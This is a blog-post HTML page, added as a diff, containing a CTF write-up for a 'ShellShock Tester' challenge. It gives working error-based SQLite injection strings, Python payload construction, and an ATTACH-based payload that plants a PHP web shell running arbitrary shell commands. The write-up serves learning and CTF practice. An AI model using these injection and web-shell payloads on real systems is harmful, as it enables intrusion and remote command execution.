@@ -1,0 +1,212 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zespre's Blog, Sometimes, we generate bugs">
+
+
+        <title>ShellShock Writeup // Zespre's Blog // Sometimes, we generate bugs</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/zespre-schmidt.html" title="See posts by Zespre Schmidt">
+                        <img class="avatar" alt="Zespre Schmidt" src="http://www.gravatar.com/avatar/93724215aa2d5a9f23d47bda8208073b">
+                </a>
+                <h2 class="article-info">Zespre Schmidt</h2>
+                <small class="about-author">Bug generator</small>
+                <h5>Published</h5>
+                <p>Tue 16 December 2014</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>ShellShock Writeup</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="/tag/secprog/">secprog</a>
+                                <a class="post-category" href="/tag/sqlite/">sqlite</a>
+                                <a class="post-category" href="/tag/sqli/">sqli</a>
+                                <a class="post-category" href="/tag/shellshock/">shellshock</a>
+                                <a class="post-category" href="/tag/writeup/">writeup</a>
+                        </p>
+                </header>
+            </section>
+            <div class="section" id="problem-description">
+<h2>Problem Description</h2>
+<p>The <a class="reference external" href="http://tor.atdog.tw:8888/index.php">ShellShock Tester</a> is the website that have some vulnerabilites.
+According to the text on the website, the vulnerabilities might not be
+ShellShock :(</p>
+<p>At the bottom of the website it says &quot;The response will be collected into
+database&quot;. Maybe SQL injection will work! After trying various types of SQL
+injection in that text input field I realized that I'm in the wrong way...</p>
+</div>
+<div class="section" id="look-deeper">
+<h2>Look Deeper</h2>
+<p>The ShellShock Tester must send something to the target website to test if it
+has bash vulnerability. Using <cite>nc</cite> to see what are sent from the ShellShock
+Tester.</p>
+<div class="highlight"><pre><span class="nv">$ </span>nc -l -p 5566
+</pre></div>
+<p>And it turns out to be the following result:</p>
+<div class="highlight"><pre>GET / HTTP/1.1
+User-Agent: () { :;}; echo &#39;ShellShockTester_atdog&#39;;
+Host: 140.113.235.153:5566
+Accept: */*
+</pre></div>
+<p>Ah-ha! The string <tt class="docutils literal">{ <span class="pre">:;};</span> echo 'ShellShockTester_atdog';</tt> is a typical method to
+test if the bash which is currently using is vulnerable to CVE-2014-6271. A
+system which is vulnerable will echo the string &quot;ShellShockTester_atdog&quot;.
+Similarly, the target website which runs CGI program will return the string if
+it is vulnerable. So why don't we build a fake HTTP server to fool the
+ShellShock Tester?</p>
+<p>Building a simple HTTP server using python module <a class="reference external" href="http://flask.pocoo.org">Flask</a>. It returns the
+string when the ShellShock Tester queried for the index page. It seems that the
+ShellShock Tester stores the response returned from the target website into its
+database using <tt class="docutils literal">insert</tt>. At the time the type of the database is still unknown.</p>
+<p>So I append a single quote right after the string, and the result showed on the
+ShellShock Tester is:</p>
+<div class="highlight"><pre>DATABASE Msg: unrecognized token: &quot;&#39;ShellShockTester_atdog&#39;&#39;)&quot;
+
+Response: ShellShockTester_atdog&#39;
+</pre></div>
+<p>Google for the error message, it says that it seems to be SQLite 3. On the other
+hand, all error messages will showed means that we can use error-based SQL
+injection.</p>
+</div>
+<div class="section" id="error-based-sql-injection">
+<h2>Error-based SQL Injection</h2>
+<p>Most of the error-based SQL injection methods are based on MySQL. But this time,
+it is SQLite... Fortunately, I found a forum post which talks about SQLite
+error-based injection, how lucky!</p>
+<p>First, create a virtual table:</p>
+<div class="highlight"><pre><span class="go">CREATE VIRTUAL TABLE v1 USING fts3(x);</span>
+</pre></div>
+<p>To know which table and column contain the flag:</p>
+<div class="highlight"><pre><span class="go">SELECT * FROM t1 WHERE t1 MATCH &#39;&quot;&#39;||(SELECT sql FROM sqlite_master);</span>
+</pre></div>
+<p>And finally, the flag showed up:</p>
+<div class="highlight"><pre><span class="go">SELECT * FROM t1 WHERE t1 MATCH &#39;&quot;&#39;||(SELECT flag FROM oyoyoyoy_____1111flag);</span>
+</pre></div>
+<p>The queries listed above should be embedded into the sophisticatedly crafted
+string. Using Python's format string will look like this:</p>
+<div class="highlight"><pre><span class="n">trick</span> <span class="o">=</span> <span class="s">&#39;ShellShockTester_atdog</span><span class="se">\&#39;</span><span class="s">); {} --&#39;</span>
+<span class="n">inj</span> <span class="o">=</span> <span class="s">&#39;create virtual table v1 using fts3(x);&#39;</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">trick</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">inj</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="section" id="inject-a-backdoor">
+<h2>Inject a Backdoor</h2>
+<p>Another method to pwn the ShellShock Tester is to place a backdoor in the
+directory of the website.</p>
+<div class="highlight"><pre><span class="n">trick</span> <span class="o">=</span> <span class="s">&#39;ShellShockTester_atdog</span><span class="se">\&#39;</span><span class="s">); {} --&#39;</span>
+<span class="n">inj</span> <span class="o">=</span> <span class="s">&#39;ATTACH </span><span class="se">\&#39;</span><span class="s">./lol.php</span><span class="se">\&#39;</span><span class="s"> AS lol; CREATE TABLE lol.pwn (dataz TEXT); INSERT INTO lol.pwn (dataz) VALUES (</span><span class="se">\&#39;</span><span class="s">&lt;pre&gt;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&lt;/pre&gt;</span><span class="se">\&#39;</span><span class="s">);&#39;</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">trick</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">inj</span><span class="p">)</span>
+</pre></div>
+<p>This will build a backdoor called <tt class="docutils literal">lol.php</tt>. So anyone can visit that page along
+with a &quot;GET&quot; argument <tt class="docutils literal">cmd</tt>. The value of <tt class="docutils literal">cmd</tt> could be any shell command. The
+reason is that <tt class="docutils literal">ATTACH</tt> command will attach a SQLite database. If the database
+does not exist, it create the database which is a PHP file. The file's content
+contains a short piece of PHP code showed above.</p>
+<p>Simply visit the page &quot;<a class="reference external" href="http://tor.atdog.tw:8888/lol.php?cmd=ls">http://tor.atdog.tw:8888/lol.php?cmd=ls</a>&quot;, it will list
+every file in the current directory. And there is the SQLite database! Download
+it and grab the flag!</p>
+</div>
+<div class="section" id="flag">
+<h2>Flag</h2>
+<p>The flag is:</p>
+<div class="highlight"><pre>SecProg{SQL1teInject1on_yoooo}
+</pre></div>
+</div>
+<div class="section" id="references">
+<h2>References</h2>
+<ul class="simple">
+<li><a class="reference external" href="http://sqlite.awardspace.info/syntax/sqlitepg03.htm">Select Queries</a></li>
+<li><a class="reference external" href="https://rdot.org/forum/showthread.php?p=26419">SQLite 3 error-based injection</a></li>
+<li><a class="reference external" href="http://atta.cked.me/home/sqlite3injectioncheatsheet">SQLite3 Injection Cheat Sheet</a></li>
+<li><a class="reference external" href="http://gwae.trollab.org/sqlite-injection.html">SQLite Injection | Hits from the bits</a></li>
+</ul>
+</div>
+
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = "zespre"; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div><footer class="footer">
+    <p>&copy; Zespre's Blog &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+    <script type="text/javascript">
+        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+        document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+        try {
+            var pageTracker = _gat._getTracker("UA-56544554-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+    </script>
+</body>
+</html>
